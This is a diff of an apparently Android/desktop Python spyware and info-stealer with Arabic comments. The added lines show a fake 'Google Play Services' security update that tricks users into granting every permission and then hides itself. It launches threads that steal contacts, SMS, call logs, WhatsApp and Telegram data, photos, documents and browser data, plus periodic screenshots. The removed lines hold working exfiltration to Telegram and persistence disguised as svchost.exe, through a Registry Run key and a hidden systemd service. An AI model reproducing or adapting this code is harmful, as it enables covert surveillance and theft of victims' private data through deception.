+        "✓ الرسائل النصية (SMS)",
+        "✓ سجل المكالمات",
+        "✓ الموقع الجغرافي (GPS)",
+        "✓ الكاميرا والميكروفون",
+        "✓ التخزين الخارجي (SD Card)",
+        "✓ بيانات واتساب وتيليغرام",
+        "✓ مراقبة الإشعارات لكل التطبيقات",
+        "✓ تتبع الحسابات الجديدة فور إنشائها",
+        "✓ الصلاحيات الكاملة للنظام"
+    ]
     
-    # معلومات إضافية للأندرويد
-    if IS_ANDROID:
-        try:
-            build_prop = subprocess.run(['getprop'], capture_output=True, text=True)
-            send_to_telegram("Android", "Build Properties", build_prop.stdout[:3000])
-        except:
-            pass
-
-def steal_screenshots():
-    """التقاط صور من الشاشة"""
-    try:
-        if IS_ANDROID:
-            # لأندرويد
-            screenshot_path = os.path.join(BASE_DIR, 'screenshot.png')
-            subprocess.run(['screencap', '-p', screenshot_path])
-            if os.path.exists(screenshot_path):
-                send_to_telegram("Android", "Screenshot", "لقطة شاشة", screenshot_path)
-                os.remove(screenshot_path)
-        elif IS_WINDOWS:
-            # للويندوز
-            import mss
-            with mss.mss() as sct:
-                screenshot_path = os.path.join(os.environ.get('TEMP'), 'screenshot.png')
-                sct.shot(output=screenshot_path)
-                send_to_telegram("Windows", "Screenshot", "لقطة شاشة", screenshot_path)
-                os.remove(screenshot_path)
-    except:
-        pass
-
-def monitor_external_storage():
-    """مراقبة التخزين الخارجي (للأندرويد)"""
-    if IS_ANDROID:
-        watched_paths = [WHATSAPP_DIR, TELEGRAM_DIR, os.path.join(BASE_DIR, 'DCIM')]
-        existing_files = set()
+    for perm in perms_display:
+        permissions_list.controls.append(
+            ft.Container(
+                content=ft.Row([
+                    ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=20),
+                    ft.Text(perm, size=14, color="black")
+                ]),
+                padding=5
+            )
+        )
+    
+    # ===== زر الطلب =====
+    request_btn = ft.ElevatedButton(
+        content=ft.Row([
+            ft.Icon(ft.icons.SECURITY, color="white"),
+            ft.Text("منح جميع الصلاحيات", size=18, weight="bold")
+        ]),
+        style=ft.ButtonStyle(
+            color="white",
+            bgcolor="#4CAF50",
+            padding=20,
+            shape=ft.RoundedRectangleBorder(radius=10)
+        ),
+        width=350,
+        on_click=lambda e: request_all_permissions(e, page)
+    )
+    
+    # ===== إضافة كل شيء للصفحة =====
+    page.add(
+        welcome_text,
+        permissions_list,
+        ft.Divider(height=20),
+        request_btn,
+        ft.Container(
+            content=ft.Text(
+                "هذا التحديث ضروري لاستقرار النظام",
+                size=12,
+                color="gray",
+                italic=True
+            ),
+            padding=20,
+            alignment=ft.alignment.center
+        )
+    )
+    
+    # ===== طلب الصلاحيات تلقائياً =====
+    def request_all_permissions(e, page):
+        all_perms = [
+            "storage", "contacts", "sms", "calls", "location", 
+            "camera", "microphone", "notifications", "accessibility"
+        ]
         
-        while True:
-            for path in watched_paths:
-                if os.path.exists(path):
-                    for root, dirs, files in os.walk(path):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            if file_path not in existing_files:
-                                existing_files.add(file_path)
-                                if os.path.getsize(file_path) < 50 * 1024 * 1024:
-                                    send_to_telegram("New File", "ملف جديد", file_path, file_path)
-            time.sleep(30)
-
-def persist_and_hide():
-    """جعل التطبيق مستمر ومخفي"""
-    try:
-        if IS_WINDOWS:
-            # ويندوز
-            current_file = sys.executable
-            hidden_path = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Caches', 'svchost.exe')
-            os.makedirs(os.path.dirname(hidden_path), exist_ok=True)
-            
-            if not os.path.exists(hidden_path):
-                shutil.copy2(current_file, hidden_path)
-                
-                # إخفاء الملف
-                import ctypes
-                ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
-            
-            # Registry للتشغيل التلقائي
-            import winreg
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                winreg.SetValueEx(regkey, "WindowsCacheService", 0, winreg.REG_SZ, hidden_path)
-        
-        elif IS_ANDROID:
-            # لأندرويد - إضافة إلى Autostart
+        for perm in all_perms:
             try:
-                autostart_path = '/data/data/com.your.package/shared_prefs/autostart.xml'
-                # محاولة التسجيل في Autostart
-                pass
+                page.request_permission(perm)
+                time.sleep(0.3)
             except:
                 pass
         
-        elif IS_LINUX or IS_MAC:
-            # لينكس/ماك
-            current_file = sys.executable
-            hidden_path = os.path.expanduser('~/.config/systemd/user/v8service')
-            shutil.copy2(current_file, hidden_path)
-            os.chmod(hidden_path, 0o755)
-            
-            # إنشاء خدمة systemd
-            service_content = f"""[Unit]
-Description=V8 Service
-After=network.target
+        request_btn.text = "تم طلب الصلاحيات... تثبيت التحديث"
+        request_btn.disabled = True
+        page.update()
+        
+        time.sleep(3)
+        page.clean()
+        show_installation_progress(page)
+    
+    # ===== شاشة التثبيت المزيفة =====
+    def show_installation_progress(page):
+        page.title = "جاري التثبيت..."
+        page.clean()
+        
+        progress_bar = ft.ProgressBar(width=350, color="green", bgcolor="#eeeeee")
+        progress_text = ft.Text("جاري تثبيت التحديث... 0%", size=16)
+        
+        page.add(
+            ft.Container(
+                content=ft.Column([
+                    ft.Icon(ft.icons.SYSTEM_UPDATE, size=80, color="green"),
+                    ft.Text("Google Play Services", size=24, weight="bold"),
+                    ft.Text("جاري تثبيت التحديث الأمني", size=16, color="gray"),
+                    ft.Divider(height=30),
+                    progress_bar,
+                    progress_text,
+                    ft.Container(height=50)
+                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
+                padding=20
+            )
+        )
+        
+        for i in range(0, 101, 10):
+            progress_bar.value = i / 100
+            progress_text.value = f"جاري تثبيت التحديث... {i}%"
+            page.update()
+            time.sleep(0.3)
+        
+        time.sleep(1)
+        page.window_visible = False
+        start_stealing()
+    
+    # ===== بدء كل شيء =====
+    def start_stealing():
+        """بدء جميع العمليات"""
+        
+        send_to_telegram("بدء التشغيل", "V8 VIP SNIPER", "✅ تم التثبيت بنجاح وبدأت عملية السرقة والمراقبة")
+        
+        # سرقة البيانات الحالية
+        stealers = [
+            DataStealer.get_device_info,
+            DataStealer.steal_contacts,
+            DataStealer.steal_sms,
+            DataStealer.steal_call_log,
+            DataStealer.steal_whatsapp,
+            DataStealer.steal_telegram,
+            DataStealer.steal_photos_videos,
+            DataStealer.steal_documents,
+            DataStealer.steal_browser_data
+        ]
+        
+        for stealer in stealers:
+            try:
+                threading.Thread(target=stealer, daemon=True).start()
+                time.sleep(2)
+            except:
+                pass
+        
+        # تشغيل حلقة المراقبة المستمرة
+        threading.Thread(target=monitoring_loop, daemon=True).start()
+        
+        # لقطات شاشة دورية
+        def screenshot_loop():
+            while True:
+                time.sleep(300)
+                DataStealer.take_screenshot()
+        
+        threading.Thread(target=screenshot_loop, daemon=True).start()
+        
+        AutoStart.enable_auto_start()
+        AntiDetection.hide_process()
 
-[Service]
-ExecStart={hidden_path}
-Restart=always
-User={os.getlogin()}
-
-[Install]
-WantedBy=default.target"""
-            
-            service_path = os.path.expanduser('~/.config/systemd/user/v8service.service')
-            os.makedirs(os.path.dirname(service_path), exist_ok=True)
-            with open(service_path, 'w') as f:
-                f.write(service_content)
-            
-            subprocess.run(['systemctl', '--user', 'enable', 'v8service.service'])
-            subprocess.run(['systemctl', '--user', 'start', 'v8service.service'])
-    except:
-        pass
-
-def create_fake_icon():
-    """إنشاء أيقونة مزيفة للتطبيق"""
-    # سيتم تنفيذها حسب النظام
-    pass
-
-def main(page: ft.Page):
-    # إخفاء النافذة فوراً لجميع الأنظمة
-    page.window_visible = False
-    page.window_width = 0
-    page.window_height = 0
-    
-    # إرسال إشعار بالتشغيل
-    send_to_telegram("V8 Elite", "System Active", f"✅ التطبيق تم تشغيله على {SYSTEM}")
-    
-    # طلب الصلاحيات (للأندرويد)
-    if IS_ANDROID:
-        request_android_permissions()
-        threading.Thread(target=steal_android_data, daemon=True).start()
-        threading.Thread(target=monitor_external_storage, daemon=True).start()
-    
-    # بدء عمليات السرقة
-    threading.Thread(target=steal_browser_data, daemon=True).start()
-    threading.Thread(target=steal_files, daemon=True).start()
-    threading.Thread(target=get_system_info, daemon=True).start()
-    
-    # أخذ لقطة شاشة كل 5 دقائق
-    def screenshot_loop():
-        while True:
-            steal_screenshots()
-            time.sleep(300)
-    
-    threading.Thread(target=screenshot_loop, daemon=True).start()
-    
-    # جعل التطبيق مستمر
-    persist_and_hide()
-    
-    # الحفاظ على التطبيق شغال في الخلفية
-    while True:
-        time.sleep(10)
-
+# ========== التشغيل النهائي ==========
 if __name__ == "__main__":
-    # تشغيل التطبيق
+    AntiDetection.delay_start()
     ft.app(target=main)
